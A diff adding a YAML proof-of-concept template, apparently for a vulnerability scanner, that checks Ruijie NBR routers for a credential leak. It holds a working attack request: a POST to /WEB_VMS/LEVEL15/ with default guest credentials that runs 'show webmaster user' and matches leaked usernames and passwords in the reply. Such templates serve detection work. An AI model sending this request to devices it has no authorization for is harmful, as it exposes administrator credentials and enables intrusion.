@@ -1,0 +1,22 @@
+name: yaml-poc-ruijie-nbr-leak-CT-158549
+binding: 057d9ac1-f9cd-47ba-b7aa-09fd0ef7987e
+detail:
+    author: system_user
+    vulnerability:
+        id: f6f80bae-8c05-4a4b-af73-9f9b7788be4f
+        level: low
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /WEB_VMS/LEVEL15/
+            headers:
+                Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("webmaster level 2 username guest password guest"))
+expression: r0()
